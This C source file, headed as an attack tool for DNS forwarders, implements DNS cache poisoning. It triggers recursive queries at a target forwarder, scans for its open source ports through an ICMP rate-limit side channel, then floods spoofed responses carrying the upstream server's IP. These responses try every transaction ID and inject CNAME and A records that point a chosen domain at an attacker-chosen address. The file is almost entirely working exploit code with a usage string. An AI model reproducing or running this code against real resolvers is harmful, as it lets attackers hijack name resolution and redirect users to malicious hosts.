/*
    Attack tool for forwarder.
*/

#include "util.h"
#include "network.h"
#include "dns.h"
#include "scanner.h"
#include "common.h"

// Some options.
unsigned int g_trigger_forwr_query_interval = 100;           // Interval of DNS query sending.
unsigned int g_spoof_time_gap               = 60000;        // Time gap (microseconds) of spoof sending.
unsigned int g_icmp_limit                   = 50;           // ICMP global limit of target server.
unsigned int g_start_scan_gap               = 1;            // Time gap to start scanning.

char* g_target_ip;
char* g_scan_src_ip;
char* g_upstream_ip;
char* g_tool_domain;
char* g_poison_domain;
char* g_poison_ip;

/* Spoof TXID 0~65535. */
static void spoof_dns_forwr_resp(int sockfd, char* src_ip, char* dst_ip, uint16_t dst_port,
        char* req_domain, char* res_domain, char* res_ip) {
    struct dns_query* query[1];
    struct dns_answer* answer[2];
    
    query[0] = new_dns_query_a(req_domain);
    answer[0] = new_dns_answer_cname(req_domain, res_domain, 10);
    answer[1] = new_dns_answer_a(res_domain, inet_addr(res_ip), RES_TTL);

    // Make DNS packet.
    uint8_t* packet = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
    size_t packet_len = make_dns_packet(packet, DNS_PKT_MAX_LEN, TRUE, 0, query, 1, answer, 2, NULL, 0, FALSE);

    // Make UDP packet.
    uint8_t* packet_raw = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
    size_t packet_raw_len = make_udp_packet(packet_raw, DNS_PKT_MAX_LEN, inet_addr(src_ip), inet_addr(dst_ip),
                                            53, dst_port, packet, packet_len);

    // Send RAW packet.
    int i;
    for (i = 0; i <= UINT16_MAX; i++) {
        // Set TXID.
        ((struct dnshdr*)(packet_raw + sizeof(struct iphdr) + sizeof(struct udphdr)))->id = htons(i);

        send_udp_packet(sockfd, packet_raw, packet_raw_len, inet_addr(src_ip), inet_addr(dst_ip),
                        53, dst_port);
        
        // Prevent packet loss.
        nsleep(1);
    }

    free(packet_raw);
    free(packet);
    free_dns_query(query[0]);
    free_dns_answer(answer[0]);
    free_dns_answer(answer[1]);
}

/* Callback for spoof. */
static void spoof_callback(uint16_t port) {
    int sockfd = make_sockfd_for_spoof();
    printf("[ * ] \tSend spoofed resp...\n");

    usleep(g_spoof_time_gap);
    spoof_dns_forwr_resp(sockfd, g_upstream_ip, g_target_ip, port, g_tool_domain, g_poison_domain, g_poison_ip);
    usleep(g_spoof_time_gap);

    printf("[ * ] \tDone.\n");
    close(sockfd);
}

/* Send DNS query to forwarder. */
static void* trigger_forwr_query_thread(void* stop_flag) {
    enum DNS_RESP_STAT stat;
    while (TRUE) {
        if (*(int*)stop_flag)
            break;
        
        stat = send_dns_query(g_target_ip, g_tool_domain, g_trigger_forwr_query_interval);

        // Stop attack if DNS response normally.
        if (stat == DNS_R_NORMAL) {
            *(int*)stop_flag = TRUE;
            printf("[ * ] Cached.\n");
        }
    }
}

/* Commence attack. */
static void attack(char* target_ip, char* scan_src_ip, char* upstream_ip, char* tool_domain,
        char* poison_domain, char* poison_ip, int verbos) {
    g_target_ip = target_ip;
    g_scan_src_ip = scan_src_ip;
    g_upstream_ip = upstream_ip;
    g_tool_domain = tool_domain;
    g_poison_domain = poison_domain;
    g_poison_ip = poison_ip;

    scan_init();
    scan_set_ignore_dns_port(TRUE);
    scan_set_scan_callback(spoof_callback);

    // Trigger recursive query.
    pthread_t query_thread;
    int stop_flag = FALSE;
    printf("[ * ] Triggering recursive query...\n");
    pthread_create(&query_thread, NULL, trigger_forwr_query_thread, &stop_flag);

    // Wait for recursive query.
    sleep(g_start_scan_gap);

    // Scan round and round, only if stop_flag is setted.
    while (TRUE) {
        // Check stop_flag.
        if (stop_flag)
            break;

        printf("[ * ] Scanning new round...\n");
        scan(scan_src_ip, target_ip, 1024, 65535, g_icmp_limit, verbos, &stop_flag);
        printf("[ * ] Done.\n");
    }

    // Waite query_thread.
    stop_flag = TRUE;
    pthread_join(query_thread, NULL);
}

int main(int argc, char** argv) {
    int ch;
    char* target_ip = NULL;
    char* scan_src_ip = NULL;
    char* upstream_ip = NULL;
    char* tool_domain = NULL;
    char* domain_poisoned = NULL;
    char* poisoned_ip = NULL;
    int verbos = FALSE;

    while ((ch = getopt(argc, argv, "t:s:u:o:d:a:v")) != -1) {
        switch (ch) {
        case 't':
            target_ip = optarg;
            break;
        case 's':
            scan_src_ip = optarg;
            break;
        case 'u':
            upstream_ip = optarg;
            break;
        case 'o':
            tool_domain = optarg;
            break;
        case 'd':
            domain_poisoned = optarg;
            break;
        case 'a':
            poisoned_ip = optarg;
            break;
        case 'v':
            verbos = TRUE;
            break;
        default:
            printf("Unknown arg\n");
            return 1;
        }
    }

    if (target_ip == NULL || scan_src_ip == NULL || upstream_ip == NULL || tool_domain == NULL
        || domain_poisoned == NULL || poisoned_ip == NULL) {
        printf("Usage:\n");
        printf("./attack_forwr -t <target_ip> -s <scan_src_ip> -u <upstream_ip> -o <tool_domain> -d <domain_poisoned> -a <poisoned_ip> [-v]\n");
        return 1;
    }

    printf("[ * ] Start.\n");
    attack(target_ip, scan_src_ip, upstream_ip, tool_domain, domain_poisoned, poisoned_ip, verbos);
    printf("[ * ] Finished.\n");

    return 0;
}
